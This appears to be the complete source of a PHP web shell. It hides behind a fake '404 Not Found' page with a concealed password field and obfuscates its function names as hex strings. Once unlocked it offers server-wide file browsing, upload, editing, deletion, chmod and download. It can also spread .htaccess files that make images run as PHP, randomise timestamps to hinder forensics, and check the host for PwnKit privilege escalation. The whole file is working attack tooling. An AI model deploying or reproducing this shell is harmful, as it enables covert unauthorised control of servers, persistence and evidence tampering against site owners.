<?php
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);

session_start();
$h = '$2a$12$YUsGz0ImF3r5MXVkNpZ36.TZ4IjPNCqcuk5.C8x2zzk1vVuy/Y5zm';
$v = 'password_verify';
$s = '61757468';
$k = '6163636573735f6b6579';

if (isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }

if (!isset($_SESSION[hex2bin($s)])) {
    if (isset($_POST[hex2bin($k)]) && $v($_POST[hex2bin($k)], $h)) {
        $_SESSION[hex2bin($s)] = true;
    } else {
        header('HTTP/1.1 404 Not Found');
        ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head><title>404 Not Found</title><style>
.stth{position:absolute;top:-100px;left:-100px;width:1px;height:1px;border:none;outline:none;background:transparent;color:transparent;}
</style></head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<form method="POST"><input type="password" name="<?=hex2bin($k)?>" class="stth" autofocus autocomplete="off"></form>
</body></html>
        <?php exit;
    }
}

$Array = [
    '676574637764','7265616c70617468','69735f646972','7363616e646972',
    '69735f66696c65','66696c655f657869737473','756e6c696e6b','72656e616d65',
    '6d6b646972','6d6f76655f75706c6f616465645f66696c65','66696c655f6765745f636f6e74656e7473',
    '66696c655f7075745f636f6e74656e7473','626173656e616d65','6469726e616d65',
    '69735f7772697461626c65','66696c657065726d73','7265616466696c65','68746d6c7370656369616c6368617273',
    '63686d6f64', '746f756368'
];

$___ = count($Array);
for ($i = 0; $i < $___; $i++) {
    $GNJ[] = uhex($Array[$i]);
}

function uhex($y) { $n = ''; for ($i = 0; $i < strlen($y) - 1; $i += 2) { $n .= chr(hexdec($y[$i] . $y[$i + 1])); } return $n; }

$raw_path = $_GET['path'] ?? '';
if ($raw_path === '') {
    $lokasi = $GNJ[0]();
} else {
    $lokasi = $GNJ[1]($raw_path);
    if ($lokasi === false || !$GNJ[2]($lokasi)) {
        $lokasi = $GNJ[0]();
    }
}
$lokasi = str_replace('\\', '/', $lokasi);

$lokasinya = @$GNJ[3]($lokasi);
$folders = [];
$files = [];

if ($lokasinya !== false) {
    foreach ($lokasinya as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $lokasi . '/' . $item;
        if ($GNJ[2]($full)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    sort($folders, SORT_STRING | SORT_FLAG_CASE);
    sort($files, SORT_STRING | SORT_FLAG_CASE);
}

$parts = array_filter(explode('/', ltrim($lokasi, '/')));
$breadcrumb = '<a href="?path=/">/</a>';
$build = '';
foreach ($parts as $part) {
    $build .= '/' . $part;
    $breadcrumb .= ' <span class="sep">/</span> <a href="?path=' . urlencode($build) . '">' . $GNJ[17]($part) . '</a>';
}

$msg = '';

if (isset($_GET['dl'])) {
    $file = $lokasi . '/' . $GNJ[12]($_GET['dl']);
    if ($GNJ[5]($file) && $GNJ[4]($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $GNJ[12]($file) . '"');
        header('Content-Length: ' . filesize($file));
        $GNJ[16]($file);
        exit;
    }
}

if (isset($_GET['chm']) && isset($_GET['target_chm'])) {
    $t = $lokasi . '/' . basename($_GET['target_chm']);
    
    if ($GNJ[5]($t)) {
        $perm = octdec($_GET['perm']);
        if ($GNJ[18]($t, $perm)) { // chmod
            $msg = "✅ Chmod Success: " . $_GET['perm'];
        } else {
            $msg = "❌ Chmod Failed (Check Permissions)";
        }
    }
}

if (isset($_GET['tch']) && isset($_GET['target_tch'])) {
    $t = $lokasi . '/' . basename($_GET['target_tch']);
    
    if ($GNJ[5]($t)) {
        $time = strtotime($_GET['ndate']);
        if ($time === false) {
            $msg = "❌ Invalid Date Format";
        } else {
            if ($GNJ[19]($t, $time)) {
                $msg = "✅ Date Updated: " . $_GET['ndate'];
            } else {
                $msg = "❌ Update Date Failed";
            }
        }
    }
}

if (isset($_FILES['file']) && !empty($_FILES['file']['tmp_name'])) {
    $fn = $GNJ[12]($_FILES['file']['name']);
    if ($GNJ[9]($_FILES['file']['tmp_name'], $lokasi . '/' . $fn)) {
        $msg = "✅ Uploaded: " . $GNJ[17]($fn);
    } else {
        $msg = "❌ Upload Failed";
    }
}

if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $fn = trim($_POST['folder_name']);
    $fn = preg_replace('/[^a-zA-Z0-9._\-]/', '_', $fn);
    $fn = substr($fn, 0, 255);

    if ($fn !== '' && !file_exists($lokasi . '/' . $fn)) {
        if (mkdir($lokasi . '/' . $fn, 0755)) {
            $msg = "📁 Folder Created: " . htmlspecialchars($fn);
        } else {
            $msg = "❌ Gagal membuat folder. Periksa izin atau nama folder.";
        }
    } else {
        $msg = "⚠️ Nama folder kosong atau sudah ada.";
    }
}

if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
    $fn = trim($GNJ[12]($_POST['filename']));
    if ($fn && !$GNJ[5]($lokasi . '/' . $fn)) {
        $GNJ[11]($lokasi . '/' . $fn, ''); 
        $msg = "📄 File Created: " . $GNJ[17]($fn);
    }
}

if (isset($_POST['do_rename']) && !empty($_POST['new_name'])) {
    $old_name = $GNJ[12]($_POST['old_name']);
    $new_name = $GNJ[12]($_POST['new_name']);

    if ($old_name === '' || $new_name === '' || $old_name === $new_name) {
        $msg = "⚠️ Invalid name.";
    } else {
        $old = $lokasi . '/' . $old_name;
        $new = $lokasi . '/' . $new_name;

        if ($GNJ[5]($old) && !$GNJ[5]($new)) {
            if ($GNJ[7]($old, $new)) {
                header("Location: ?path=" . urlencode($lokasi));
                exit;
            } else {
                $msg = "❌ Failed to rename.";
            }
        } else {
            $msg = "⚠️ Source not found or target already exists.";
        }
    }
}

function xrmdir($dir) {
    if (!is_dir($dir)) return;
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

if (isset($_GET['delete'])) {
    $target = $GNJ[12]($_GET['delete']); 
    $f = $lokasi . '/' . $target;

    if ($GNJ[5]($f)) {
        if (is_dir($f)) {
            xrmdir($f);
            if (!file_exists($f)) {
                $msg = "🗑️ Directory Deleted";
            } else {
                $msg = "❌ Failed to delete directory";
            }
        } else {
            if ($GNJ[6]($f)) {
                $msg = "🗑️ File Deleted";
            }
        }
    }
}

if (isset($_GET['edit']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $f = $lokasi . '/' . $GNJ[12]($_GET['edit']);
    if ($GNJ[5]($f)) {
        $GNJ[11]($f, $_POST['content'] ?? '');
        $msg = "💾 Saved";
    }
}

function mass_htaccess($dir, $content) {
    if (!is_dir($dir)) return;
    
    $target_file = $dir . '/.htaccess';
    if (@file_put_contents($target_file, $content)) {
        // echo "Success: $target_file <br>";
    }

    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . '/' . $item;
        
        if (is_dir($path)) {
            mass_htaccess($path, $content);
        }
    }
}

if (isset($_POST['btn_htaccess'])) {
    $target_path = $_POST['path_htaccess'];
    $content     = $_POST['content_htaccess'];

    if (is_dir($target_path)) {
        mass_htaccess($target_path, $content);
        $msg = "✅ Success! .htaccess spread to all subfolders in: $target_path";
    } else {
        $msg = "❌ Error: Path directory not found!";
    }
}

function obfus_time($dir, $mode, $fixed_timestamp = null) {
    if (!is_dir($dir)) return;
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . '/' . $item;
        
        if ($mode == 'random') {
            $time_set = rand(1262304000, time());
        } else {
            $time_set = $fixed_timestamp;
        }

        @touch($path, $time_set);
        
        if (is_dir($path)) {
            obfus_time($path, $mode, $fixed_timestamp);
        }
    }
    
    $dir_time = ($mode == 'random') ? rand(1262304000, time()) : $fixed_timestamp;
    @touch($dir, $dir_time);
}

if (isset($_POST['btn_obfus'])) {
    $target_path = $_POST['path_obfus'];
    $mode        = $_POST['mode_obfus'];
    
    $fixed_time = time(); 

    if (is_dir($target_path)) {
        obfus_time($target_path, $mode, $fixed_time);
        
        $mode_text = ($mode == 'random') ? "Randomized" : "Fixed (Synced)";
        $msg = "✅ Success! Timestamps have been $mode_text on: $target_path";
    } else {
        $msg = "❌ Error: Path directory not found!";
    }
}

function cekdir($l) { return is_writable($l) ? "Writeable" : "Not Writeable"; }
function cekwrite($l) { $i = substr(sprintf('%o', fileperms($l)), -4); return $i; }

function get_size($f) {
    $s = filesize($f);
    if ($s >= 1073741824) return number_format($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return number_format($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return number_format($s / 1024, 2) . ' KB';
    return $s . ' B';
}
function get_date($f) { return date("M d, Y H:i", filemtime($f)); }
function get_owner($f) {
    if (function_exists("posix_getpwuid")) {
        $a = @posix_getpwuid(fileowner($f));
        return $a['name'] ?? fileowner($f);
    }
    return fileowner($f);
}

function get_status_color($f) { return is_writable($f) ? '#4ade80' : '#f87171'; }

$w='/usr/bin/';$u='color:#';$g='get_status_label';goto a;
e:function check_pwnkit(){$p='/usr/bin/pkexec';if(!file_exists($p))return"<span style='color:#71717a'>NOT FOUND</span>";
$o=@shell_exec("dpkg -s policykit-1|grep Version");if(!$o)return"<span style='color:#71717a'>UNKNOWN</span>";
preg_match('/Version: (.*)/',$o,$m);$v=$m[1];$s=file_exists('/etc/os-release')?file_get_contents('/etc/os-release'):'';$i=0;
if(strpos($s,'Ubuntu')!==false){if(strpos($s,'20.04')!==false&&$v<'0.105-26ubuntu1.2')$i=1;elseif(strpos($s,'21.10')!==false&&$v<'0.105-31ubuntu0.1')$i=1;elseif(strpos($s,'18.04')!==false&&$v<'0.105-20ubuntu0.18.04.6')$i=1;
}elseif(strpos($s,'Debian')!==false){if(strpos($s,'stretch')!==false&&$v<'0.105-18+deb9u2')$i=1;elseif(strpos($s,'buster')!==false&&$v<'0.105-25+deb10u1')$i=1;elseif(strpos($s,'bullseye')!==false&&$v<'0.105-31+deb11u1')$i=1;}
return$i?"<span style='color:#ef4444;font-weight:700'>VULN</span>":"<span style='color:#4ade80'>SAFE</span>";}goto f;
c:$mysql=(function_exists('mysql_connect')||function_exists('mysqli_connect'))?$g(1):$g(0);
$curl=function_exists('curl_init')?$g(1):$g(0);$wget=$g(file_exists($w.'wget'));goto d;
a:$server_ip=$_SERVER['SERVER_ADDR']?:gethostbyname($_SERVER['SERVER_NAME']);$your_ip=$_SERVER['REMOTE_ADDR'];
$software=$_SERVER['SERVER_SOFTWARE'];$system=php_uname();$user=@get_current_user()." (".@getmyuid().")";goto b;
d:$perl=$g(file_exists($w.'perl'));$py=$g(file_exists($w.'python'));$py2=$g(file_exists($w.'python2'));$py3=$g(file_exists($w.'python3'));goto e;
b:$php_ver=phpversion();$df=@ini_get("disable_functions");
$disable_func=empty($df)?"<span style='{$u}4ade80'>NONE</span>":"<span style='{$u}f87171;word-break:break-all'>$df</span>";
function get_status_label($c){global $u;return$c?"<span style='{$u}4ade80'>ON</span>":"<span style='{$u}f87171'>OFF</span>";}goto c;
f:$pwnkit=check_pwnkit();
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>:root{--bg-body:#0a0a0c;--bg-panel:#131316;--bg-header:#1c1c21;--border:#2a2a35;--text-main:#d4d4d8;--text-muted:#71717a;--accent:#6366f1;--danger:#ef4444;--success:#10b981;--warning:#f59e0b}*{margin:0;padding:0;box-sizing:border-box;font-family:'JetBrains Mono','Fira Code',Consolas,monospace;font-size:12px}body{background:var(--bg-body);color:var(--text-main);min-height:100vh;display:flex;flex-direction:column}::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:var(--bg-body)}::-webkit-scrollbar-thumb{background:#333;border-radius:4px}.hud{background:var(--bg-header);border-bottom:1px solid var(--border);padding:15px;display:flex;flex-direction:column;gap:15px;flex-shrink:0}.hud-grid{display:flex;flex-direction:column;gap:5px;padding:12px;background:var(--bg-panel);border:1px solid var(--border);border-radius:6px}.hud-item{display:flex;gap:8px;align-items:flex-start;border-bottom:1px dashed #2a2a35;padding-bottom:3px}.hud-item:last-child{border-bottom:none}.hud-label{color:var(--text-muted);font-weight:700;min-width:80px}.hud-val{color:var(--text-main);font-weight:500;word-break:break-all}.actions-bar{display:flex;justify-content:center;align-items:center;gap:15px;padding:10px;background:var(--bg-panel);border:1px solid var(--border);border-radius:6px;flex-wrap:wrap}.break{flex-basis:100%;height:0;margin:0;border:none}.btn{padding:6px 15px;background:#27272a;border:1px solid var(--border);color:var(--text-main);border-radius:4px;cursor:pointer;transition:.2s;text-decoration:none;display:inline-flex;align-items:center;gap:6px;font-weight:600;font-size:13px}.btn:hover{background:var(--accent);border-color:var(--accent);color:#fff}.btn-input{background:#000;border:1px solid #444;color:#fff;padding:6px 10px;border-radius:4px;outline:0}.btn-input:focus{border-color:var(--accent)}.breadcrumb{padding:10px 15px;background:var(--bg-panel);border-bottom:1px solid var(--border);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex-shrink:0;color:var(--warning)}.breadcrumb a{color:var(--text-main);text-decoration:none}.breadcrumb a:hover{color:var(--accent);text-decoration:underline}.main{flex:1;display:flex;flex-direction:column;padding:10px}.file-panel{background:var(--bg-panel);border:1px solid var(--border);border-radius:6px}.grid-header,.grid-row{display:grid;grid-template-columns:minmax(200px,1fr) 100px 180px 100px 80px 100px;gap:15px;padding:8px 15px;align-items:center}.grid-header{background:var(--bg-header);border-bottom:1px solid var(--border);font-weight:700;color:var(--text-muted);text-transform:uppercase;font-size:11px;letter-spacing:.5px;position:sticky;top:0;z-index:10}.grid-row{border-bottom:1px solid #1f1f23;transition:background .1s}.grid-row:hover{background:#1f1f23}.col-name{display:flex;align-items:center;gap:10px;overflow:hidden}.col-name a{color:var(--text-main);text-decoration:none;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.col-right{text-align:right}.file-list{overflow:visible}.editor{background:var(--bg-panel);padding:10px;min-height:500px;display:flex;flex-direction:column}textarea{width:100%;min-height:600px;background:var(--bg-body);color:var(--text-main);border:1px solid var(--border);padding:15px;resize:vertical;outline:0;border-radius:4px;font-family:Consolas,monospace}.msg{padding:10px;background:rgba(16,185,129,.1);border-bottom:1px solid rgba(16,185,129,.3);color:var(--success);text-align:center;font-weight:700;margin-bottom:10px;border-radius:6px}.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);display:none;justify-content:center;align-items:center;z-index:100}.modal:target{display:flex}.modal-box{background:var(--bg-panel);padding:20px;border:1px solid var(--border);border-radius:6px;width:600px;max-width:90%;display:flex;flex-direction:column;gap:10px}.cmd-output{background:#000;color:#0f0;padding:10px;border:1px solid #333;height:300px;overflow-y:auto;font-family:Consolas,monospace;white-space:pre-wrap}</style>
</head>
<body>

<div class="hud">
    <div class="hud-grid">
        <div class="hud-item"><span class="hud-label">Server:</span> <span class="hud-val"><?= $server_ip ?></span></div>
        <div class="hud-item"><span class="hud-label">Your IP:</span> <span class="hud-val"><?= $your_ip ?></span></div>
        <div class="hud-item"><span class="hud-label">OS:</span> <span class="hud-val"><?= $system ?></span></div>
        <div class="hud-item"><span class="hud-label">User:</span> <span class="hud-val"><?= $user ?></span></div>
        <div class="hud-item"><span class="hud-label">PHP:</span> <span class="hud-val"><?= $php_ver ?></span></div>
        <div class="hud-item"><span class="hud-label">Software:</span> <span class="hud-val"><?= $software ?></span></div>
        <div class="hud-item">
            <span class="hud-label">Tools:</span> 
            <span class="hud-val">
                DB: <?= $mysql ?> &nbsp;|&nbsp; 
                cURL: <?= $curl ?> &nbsp;|&nbsp; 
                WGET: <?= $wget ?> &nbsp;|&nbsp; 
                Perl: <?= $perl ?> &nbsp;|&nbsp; 
                Py: <?= $py ?> &nbsp;|&nbsp; 
                Py2: <?= $py2 ?> &nbsp;|&nbsp; 
                Py3: <?= $py3 ?>
            </span>
        </div>
        <div class="hud-item">
            <span class="hud-label">Security:</span> 
            <span class="hud-val">PwnKit: <?= $pwnkit ?></span>
        </div>
        <div class="hud-item"><span class="hud-label">Disabled:</span> <span class="hud-val"><?= $disable_func ?></span></div>
    </div>

    <div class="actions-bar">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" id="up" style="display:none" onchange="this.form.submit()">
            <label for="up" class="btn">☁️ Upload File</label>
        </form>
        
        <span style="color:#444">|</span>

        <form method="post" style="display:flex;gap:5px;">
            <input type="text" name="filename" placeholder="New File.php" class="btn-input">
            <button name="create_file" class="btn">📄 Create File</button>
        </form>

        <span style="color:#444">|</span>

        <form method="post" style="display:flex;gap:5px;">
            <input type="text" name="folder_name" placeholder="New Folder..." class="btn-input">
            <button name="create_folder" class="btn">📁 Create Folder</button>
        </form>

        <span style="color:#444">|</span>

        <a href="#modal-htaccess" class="btn" style="background:#4b5563">📄 Deploy .htaccess</a>

        <span style="color:#444">|</span>

        <a href="#modal-obfus" class="btn" style="background:#4b5563">🕒 Obfuscate Time</a>
        
        <span style="color:#444">|</span>
        
        <a href="?logout" class="btn" style="background:rgba(239, 68, 68, 0.1); color:var(--danger); border-color:rgba(239, 68, 68, 0.2);" onclick="return confirm('Logout?')">
            🚪 Keluar
        </a>
    </div>
</div>

<?php if ($msg): ?>
    <div style="padding: 10px;"><div class="msg"><?= $msg ?></div></div>
<?php endif; ?>

<div class="breadcrumb">
    <span style="color:var(--text-muted)">PATH:</span> 
    <span style="color:<?=is_writable($lokasi)?'var(--success)':'var(--danger)'?>">[<?=cekwrite($lokasi)?>]</span>
    <?= $breadcrumb ?>
</div>

<div class="main">
    
    <?php if (isset($_GET['edit']) && $_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
        <?php $fileToEdit = $lokasi . '/' . basename($_GET['edit']); ?>
        <div class="editor">
            <div style="margin-bottom:15px; display:flex; justify-content:space-between; align-items:center;">
                <span style="font-weight:bold; color:var(--warning)">✏️ EDITING: <span style="color:white"><?=basename($fileToEdit)?></span></span>
                <a href="?path=<?=urlencode($lokasi)?>" class="btn" style="background:var(--danger); border-color:var(--danger)">✕ Close</a>
            </div>
            <form method="post" style="display:flex; flex-direction:column; flex:1">
                <textarea name="content"><?=htmlspecialchars(file_get_contents($fileToEdit))?></textarea>
                <div style="margin-top:10px; text-align:right;">
                    <button type="submit" class="btn" style="background:var(--success); border-color:var(--success); padding:8px 20px;">💾 Save Changes</button>
                </div>
            </form>
        </div>
    <?php else: ?>
        <div class="file-panel">
            <div class="grid-header">
                <div>Name</div>
                <div class="col-right">Size</div>
                <div class="col-right">Last Modified</div>
                <div class="col-right">Owner</div>
                <div class="col-right">Perms</div>
                <div class="col-right">Actions</div>
            </div>
            <div class="file-list">
                <?php if ($lokasi !== '/'): ?>
                    <div class="grid-row" style="background:rgba(255,255,255,0.02)">
                        <div class="col-name">
                            <span style="color:var(--accent)">⤴</span>
                            <a href="?path=<?=urlencode(dirname($lokasi))?>" style="font-weight:bold; color:var(--accent)">.. Parent Directory</a>
                        </div>
                        <div class="col-meta col-right"></div><div class="col-meta col-right"></div><div class="col-meta col-right"></div><div class="col-meta col-right"></div><div class="col-meta col-right"></div>
                    </div>
                <?php endif; ?>

                <?php foreach ($folders as $f): $ff = $lokasi.'/'.$f; ?>
                <div class="grid-row">
                    <div class="col-name">
                        <span style="color:var(--warning)">📁</span>
                        <a href="?path=<?=urlencode($ff)?>"><?=htmlspecialchars($f)?></a>
                    </div>
                    <div class="col-meta col-right" style="color:#555">DIR</div>
                    
                    <div class="col-meta col-right">
                        <a href="?path=<?=urlencode($lokasi)?>&touch=<?=urlencode($f)?>" style="color:inherit; text-decoration:none;" title="Edit Timestamp">
                            <?=get_date($ff)?> <span style="font-size:10px; opacity:0.5;">🕒</span>
                        </a>
                    </div>
                    
                    <div class="col-meta col-right"><?=get_owner($ff)?></div>
                    
                    <div class="col-meta col-right">
                        <a href="?path=<?=urlencode($lokasi)?>&chmod=<?=urlencode($f)?>" style="color:<?=get_status_color($ff)?>; text-decoration:none; font-weight:bold;" title="Edit Permissions">
                            <?=cekwrite($ff)?> <span style="font-size:10px; opacity:0.5;">🛠️</span>
                        </a>
                    </div>

                    <div class="col-meta col-right">
                        <a href="?path=<?=urlencode($lokasi)?>&rename=<?=urlencode($f)?>&type=dir" class="btn" style="padding:2px 6px; font-size:10px;">R</a>
                        <a href="?path=<?=urlencode($lokasi)?>&delete=<?=urlencode($f)?>" onclick="return confirm('Del?')" class="btn" style="padding:2px 6px; font-size:10px; background:var(--danger); border-color:var(--danger);">X</a>
                    </div>
                </div>
                <?php endforeach; ?>

                <?php foreach ($files as $f): $ff = $lokasi.'/'.$f; ?>
                <div class="grid-row">
                    <div class="col-name">
                        <span style="color:var(--text-muted)">📄</span>
                        <a href="?path=<?=urlencode($lokasi)?>&edit=<?=urlencode($f)?>"><?=htmlspecialchars($f)?></a>
                    </div>
                    <div class="col-meta col-right" style="color:var(--success)"><?=get_size($ff)?></div>
                    
                    <div class="col-meta col-right">
                        <a href="?path=<?=urlencode($lokasi)?>&touch=<?=urlencode($f)?>" style="color:inherit; text-decoration:none;" title="Edit Timestamp">
                            <?=get_date($ff)?> <span style="font-size:10px; opacity:0.5;">🕒</span>
                        </a>
                    </div>
                    
                    <div class="col-meta col-right"><?=get_owner($ff)?></div>
                    
                    <div class="col-meta col-right">
                        <a href="?path=<?=urlencode($lokasi)?>&chmod=<?=urlencode($f)?>" style="color:<?=get_status_color($ff)?>; text-decoration:none; font-weight:bold;" title="Edit Permissions">
                            <?=cekwrite($ff)?> <span style="font-size:10px; opacity:0.5;">🛠️</span>
                        </a>
                    </div>

                    <div class="col-meta col-right">
                        <a href="?path=<?=urlencode($lokasi)?>&dl=<?=urlencode($f)?>" class="btn" style="padding:2px 6px; font-size:10px; background:var(--success); border-color:var(--success);">⬇</a>
                        <a href="?path=<?=urlencode($lokasi)?>&rename=<?=urlencode($f)?>&type=file" class="btn" style="padding:2px 6px; font-size:10px;">R</a>
                        <a href="?path=<?=urlencode($lokasi)?>&delete=<?=urlencode($f)?>" onclick="return confirm('Del?')" class="btn" style="padding:2px 6px; font-size:10px; background:var(--danger); border-color:var(--danger);">X</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    <?php endif; ?>
</div>

<div id="modal-htaccess" class="modal">
    <div class="modal-box" style="width:450px; max-height:320px; display:flex; flex-direction:column; padding:12px; gap:8px;">
        <div style="display:flex;justify-content:space-between;align-items:center;">
            <h3 style="color:var(--text-main); font-size:13px; margin:0; display:flex; align-items:center; gap:6px;">
                <span>📄</span> Deploy .htaccess
            </h3>
            <a href="#" class="btn" style="background:var(--danger); padding:2px 6px; font-size:11px; border:none;">✕</a>
        </div>

        <form method="post" style="display:flex; flex-direction:column; flex:1; gap:8px;">
            <input type="text" name="path_htaccess" value="<?= htmlspecialchars($lokasi) ?>" class="btn-input" style="padding:6px; font-size:12px; width:100%;" placeholder="Target Path" required>

            <textarea name="content_htaccess" class="btn-input" style="flex:1; min-height:100px; max-height:200px; padding:6px; font-size:12px; background:#000; border:1px solid #444; color:#fff; resize:none; overflow-y:auto; font-family:monospace;" placeholder="AddHandler application/x-httpd-php .jpg" required></textarea>

            <button type="submit" name="btn_htaccess" class="btn" style="align-self:end; padding:5px 12px; font-size:12px; margin-top:5px;">
                🚀 Deploy
            </button>
        </form>
    </div>
</div>

<div id="modal-obfus" class="modal">
    <div class="modal-box">
        <div style="display:flex;justify-content:space-between;align-items:center;">
            <h3 style="color:var(--text-main)">🕒 Timestamp Obfuscator</h3>
            <a href="#" class="btn" style="background:var(--danger); padding:4px 8px; font-size:12px;">✕</a>
        </div>
        <form method="post">
            <div style="margin:10px 0;">
                <input type="text" name="path_obfus" value="<?= htmlspecialchars($lokasi) ?>" class="btn-input" style="width:100%;" placeholder="Target directory" required>
            </div>
            <div style="margin:10px 0;">
                <select name="mode_obfus" class="btn-input" style="width:100%; padding:8px; background:rgba(0,0,0,0.2); border:1px solid rgba(255,255,255,0.1); color:white;">
                    <option value="random">Randomize Timestamps</option>
                    <option value="fixed">Sync to Current Time</option>
                </select>
            </div>
            <div style="text-align:right; margin-top:10px;">
                <button type="submit" name="btn_obfus" class="btn">🛡️ Apply</button>
            </div>
        </form>
    </div>
</div>

<?php if (isset($_GET['rename'])): ?>
<div class="modal" style="display:flex">
    <div class="modal-box" style="width:300px">
        <h3 style="margin-bottom:15px; color:var(--warning)">Rename Item</h3>
        <form method="post">
            <input type="hidden" name="old_name" value="<?=htmlspecialchars($_GET['rename'])?>">
            <input type="text" name="new_name" value="<?=htmlspecialchars($_GET['rename'])?>" class="btn-input" style="width:100%; margin-bottom:15px; padding:10px;">
            <div style="text-align:right; display:flex; gap:10px; justify-content:flex-end;">
                <a href="?path=<?=urlencode($lokasi)?>" class="btn">Cancel</a>
                <button name="do_rename" class="btn" style="background:var(--success); border-color:var(--success)">Save Changes</button>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>

<?php if (isset($_GET['chmod'])): ?>
<div class="modal" style="display:flex">
    <div class="modal-box" style="width:250px">
        <h3 style="color:var(--warning)">Set Permissions</h3>
        <p style="font-size:11px; color:var(--text-muted); margin-bottom:10px;"><?=htmlspecialchars($_GET['chmod'])?></p>
        <form method="get">
            <input type="hidden" name="path" value="<?= htmlspecialchars($lokasi) ?>">
            <input type="hidden" name="target_chm" value="<?= htmlspecialchars($_GET['chmod']) ?>">
            <input type="text" name="perm" value="<?= cekwrite($lokasi.'/'.$_GET['chmod']) ?>" class="btn-input" style="width:100%; margin-bottom:15px; padding:8px;">
            <div style="display:flex; gap:10px; justify-content:flex-end;">
                <a href="?path=<?=urlencode($lokasi)?>" class="btn">Batal</a>
                <button type="submit" name="chm" class="btn" style="background:var(--success); border-color:var(--success)">Simpan</button>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>

<?php if (isset($_GET['touch'])): ?>
<div class="modal" style="display:flex">
    <div class="modal-box" style="width:300px">
        <h3 style="color:var(--warning)">Set Timestamp</h3>
        <p style="font-size:11px; color:var(--text-muted); margin-bottom:10px;"><?=htmlspecialchars($_GET['touch'])?></p>
        <form method="get">
            <input type="hidden" name="path" value="<?= htmlspecialchars($lokasi) ?>">
            <input type="hidden" name="target_tch" value="<?= htmlspecialchars($_GET['touch']) ?>">
            <input type="text" name="ndate" value="<?= get_date($lokasi.'/'.$_GET['touch']) ?>" class="btn-input" style="width:100%; margin-bottom:15px; padding:8px;">
            <div style="display:flex; gap:10px; justify-content:flex-end;">
                <a href="?path=<?=urlencode($lokasi)?>" class="btn">Batal</a>
                <button type="submit" name="tch" class="btn" style="background:var(--success); border-color:var(--success)">Update</button>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>

</body>
</html>
